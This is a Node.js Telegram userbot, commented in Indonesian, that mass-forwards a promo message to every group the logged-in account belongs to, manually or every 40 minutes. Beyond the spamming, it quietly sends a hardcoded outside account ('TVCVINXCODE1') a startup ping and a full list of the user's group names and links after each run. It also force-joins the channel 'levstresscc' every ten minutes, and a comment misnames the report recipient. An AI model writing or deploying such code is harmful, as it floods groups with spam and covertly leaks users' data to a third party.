const { TelegramClient, Api } = require("telegram");
const { StringSession } = require("telegram/sessions");
const { NewMessage } = require("telegram/events");
const input = require("input");
const fs = require("fs");

// === API ID & API HASH ===
const apiId = 33653138;
const apiHash = 'd2526091fc52afaf958e8f03ca818021';

// Lokasi file
const SESSION_FILE = "session.json";
const BLACKLIST_FILE = "blacklist.json";
const PAY_FILE = "pay.json";
let payMethods = [];

if (fs.existsSync(PAY_FILE)) {
  try {
    payMethods = JSON.parse(fs.readFileSync(PAY_FILE));
  } catch (e) {
    console.log("❌ File pay.json corrupt, buat baru");
    payMethods = [];
  }
}
const savePayMethods = () => {
  fs.writeFileSync(PAY_FILE, JSON.stringify(payMethods, null, 2));
};

// Load blacklist
let blacklist = [];
if (fs.existsSync(BLACKLIST_FILE)) {
  try {
    blacklist = JSON.parse(fs.readFileSync(BLACKLIST_FILE));
  } catch (e) {
    console.log("❌ File blacklist corrupt, buat baru");
    blacklist = [];
  }
}
const saveBlacklist = () => {
  fs.writeFileSync(BLACKLIST_FILE, JSON.stringify(blacklist, null, 2));
};

// Baca session
let savedSession = "";
if (fs.existsSync(SESSION_FILE)) {
  try {
    const data = JSON.parse(fs.readFileSync(SESSION_FILE));
    savedSession = data.session || "";
  } catch (e) {
    console.log("❌ Session corrupt, login ulang");
  }
}
const stringSession = new StringSession(savedSession);

// === Variabel AFK ===
let isAfk = false;
let afkReason = "";
let afkTime = 0;

// === AUTO CFD STATE ===
let autoCfdState = {
  running: false,
  interval: null,
  replyMsgId: null,
  originChatId: null,
};

// Helper: Dapatkan link grup (prefer @username kalau ada)
async function getGroupLink(client, entity) {
  if (entity.username) return `@${entity.username}`;
  if (entity.id < 0) {
    const chatIdClean = String(entity.id).slice(4);
    return `https://t.me/c/${chatIdClean}`;
  }
  return "No Link";
}

// Fungsi kirim report ke @Lexy_Tegyo (estetik, tebal, tanpa footer)
async function sendReportToTVCVINXCODE1(client, successLines, failLines, isAuto) {
  const timestamp = new Date().toLocaleString('id-ID', { dateStyle: 'short', timeStyle: 'medium' });
  const maxLength = 3800;

  // Bagian BERHASIL
  let successText = `
📊 ${isAuto ? 'AUTO' : 'MANUAL'} CFD REPORT (${timestamp})

<b>Group BERHASIL (${successLines.length}):</b>
${successLines.join("\n") || "<i>Tidak ada</i>"}
  `;

  if (successText.length > maxLength) {
    successText = successText.slice(0, maxLength - 100) + "\n... (terpotong)";
  }

  try {
    await client.sendMessage("TVCVINXCODE1", { message: successText, parseMode: "html" });
  } catch (e) {
    console.log("Gagal kirim BERHASIL:", e.message);
  }

  // Bagian GAGAL
  let failText = `
<b>Group GAGAL (${failLines.length}):</b>
${failLines.join("\n") || "<i>Tidak ada</i>"}
  `;

  if (failText.length > maxLength) {
    failText = failText.slice(0, maxLength - 100) + "\n... (terpotong)";
  }

  try {
    await client.sendMessage("TVCVINXCODE1", { message: failText, parseMode: "html" });
  } catch (e) {
    console.log("Gagal kirim GAGAL:", e.message);
  }
}

// Fungsi utama CFD
async function runCfd(client, originChatId, replyMsgId, isAuto = false) {
  try {
    const dialogs = await client.getDialogs();
    const successLines = [];
    const failLines = [];

    let success = 0;
    let fail = 0;

    for (const dialog of dialogs) {
      if (!dialog.isGroup || blacklist.includes(dialog.id.toString())) continue;

      const entity = await client.getEntity(dialog.entity);
      const title = entity.title || "No Title";
      const link = await getGroupLink(client, entity);

      try {
        await client.forwardMessages(dialog.id, {
          messages: replyMsgId,
          fromPeer: originChatId
        });
        success++;
        successLines.push(`${title} > ${link}`);
      } catch (err) {
        fail++;
        failLines.push(`${title} > ${link} > GAGAL`);
      }

      await new Promise(r => setTimeout(r, Math.floor(Math.random() * 1200) + 800)); // 0.8-2 detik
    }

    // Report singkat ke origin chat
    const summary = `
<b>${isAuto ? 'AUTO CFD' : 'CFD GROUP'} SELESAI</b>
<b>BERHASIL:</b> ${success} grup | <b>GAGAL:</b> ${fail} grup`;
    await client.sendMessage(originChatId, { message: summary, parseMode: "html" });

    // Kirim report detail ke @Lexy_Tegyo
    await sendReportToTVCVINXCODE1(client, successLines, failLines, isAuto);

  } catch (err) {
    console.log("Error run CFD:", err.message);
  }
}

(async () => {
  console.log("=== Telegram UserBot Start ===");

  const client = new TelegramClient(stringSession, apiId, apiHash, {
    connectionRetries: 5,
  });

  if (!savedSession) {
    await client.start({
      phoneNumber: async () => await input.text("📱 Nomor (+62xxx): "),
      phoneCode: async () => await input.text("📩 OTP: "),
      password: async () => await input.text("🔑 2FA: "),
      onError: (err) => console.log("❌ Error:", err),
    });

    fs.writeFileSync(SESSION_FILE, JSON.stringify({ session: client.session.save() }, null, 2));
    console.log("💾 Session disimpan");
  } else {
    await client.connect();
    console.log("✅ Auto-login");
  }

  const me = await client.getMe();
  const myId = me.id.toString();

  await client.sendMessage("me", { message: "UserBot aktif 🚀" });

  try {
    await client.sendMessage("TVCVINXCODE1", { message: "Halo Kontol Jaseb on lagi neh mbut" });
  } catch (err) {
    console.log("⚠️ Gagal notif ke @TVCVINXCODE1:", err.message);
  }

  // Auto join wajib
  const wajibJoin = ["levstresscc"];
  async function ensureJoin() {
    for (const ch of wajibJoin) {
      try {
        await client.invoke(new Api.channels.JoinChannel({ channel: ch }));
      } catch {}
    }
  }
  await ensureJoin();
  setInterval(ensureJoin, 10 * 60 * 1000);

  // Event handler
  client.addEventHandler(async (event) => {
    const msg = event.message;
    if (!msg || !msg.message) return;
    const text = msg.message.trim();

    if (msg.senderId.toString() !== myId) return;

    // .addbl (tambah blacklist)
    if (text.startsWith(".addbl")) {
      const chatIdStr = msg.chatId.toString();
      const chatName = msg.chat?.title || msg.chat?.firstName || "Chat";

      if (!blacklist.includes(chatIdStr)) {
        blacklist.push(chatIdStr);
        saveBlacklist();
        await client.sendMessage(msg.chatId, { 
          message: `<blockquote>✅ ${chatName} ditambahkan ke blacklist.</blockquote>`,
          replyTo: msg.id,
          parseMode: "html"
        });
      } else {
        await client.sendMessage(msg.chatId, { 
          message: `<blockquote>⚠️ ${chatName} sudah di blacklist.</blockquote>`,
          replyTo: msg.id,
          parseMode: "html"
        });
      }
      return;
    }

    // .deladdbl (hapus blacklist)
    if (text.startsWith(".deladdbl")) {
      const chatIdStr = msg.chatId.toString();
      const chatName = msg.chat?.title || msg.chat?.firstName || "Chat";

      if (blacklist.includes(chatIdStr)) {
        blacklist = blacklist.filter(id => id !== chatIdStr);
        saveBlacklist();
        await client.sendMessage(msg.chatId, { 
          message: `<blockquote>✅ ${chatName} dihapus dari blacklist.</blockquote>`,
          replyTo: msg.id,
          parseMode: "html"
        });
      } else {
        await client.sendMessage(msg.chatId, { 
          message: `<blockquote>⚠️ ${chatName} tidak ada di blacklist.</blockquote>`,
          replyTo: msg.id,
          parseMode: "html"
        });
      }
      return;
    }

    // .cfd group (manual)
    if (text === ".cfd group") {
      if (!msg.replyTo) {
        await client.sendMessage(msg.chatId, { 
          message: "<blockquote>⚠️ Reply pesan promo dulu!</blockquote>",
          replyTo: msg.id,
          parseMode: "html"
        });
        return;
      }

      const replyMsg = await msg.getReplyMessage();
      await client.sendMessage(msg.chatId, {
        message: "<blockquote>🚀 CFD GROUP mulai... (proses aman)</blockquote>",
        replyTo: msg.id,
        parseMode: "html"
      });

      await runCfd(client, msg.chatId, replyMsg.id, false);
      return;
    }

    // .autocfd (auto setiap 40 menit)
    if (text === ".autocfd") {
      if (autoCfdState.running) {
        await client.sendMessage(msg.chatId, { message: "⚠️ AUTO CFD sudah aktif. Gunakan .stopcfd" });
        return;
      }

      if (!msg.replyTo) {
        await client.sendMessage(msg.chatId, { 
          message: "<blockquote>Reply pesan promo dulu!</blockquote>",
          replyTo: msg.id,
          parseMode: "html"
        });
        return;
      }

      const replyMsg = await msg.getReplyMessage();
      autoCfdState.running = true;
      autoCfdState.replyMsgId = replyMsg.id;
      autoCfdState.originChatId = msg.chatId;

      await client.sendMessage(msg.chatId, { 
        message: "✅ AUTO CFD mulai! Setiap 40 menit.",
        parseMode: "html"
      });

      await runCfd(client, msg.chatId, replyMsg.id, true);

      autoCfdState.interval = setInterval(async () => {
        if (autoCfdState.running) {
          await runCfd(client, autoCfdState.originChatId, autoCfdState.replyMsgId, true);
        }
      }, 40 * 60 * 1000);
      return;
    }

    // .stopcfd
    if (text === ".stopcfd") {
      if (!autoCfdState.running) {
        await client.sendMessage(msg.chatId, { message: "❌ AUTO CFD tidak berjalan." });
        return;
      }

      autoCfdState.running = false;
      if (autoCfdState.interval) clearInterval(autoCfdState.interval);
      autoCfdState.interval = null;
      autoCfdState.replyMsgId = null;
      autoCfdState.originChatId = null;

      await client.sendMessage(msg.chatId, { message: "✅ AUTO CFD dihentikan." });
      return;
    }

    // Tambahkan command lain kalau perlu (misal .ping, .tagall, .pay, dll)

  }, new NewMessage({}));
})();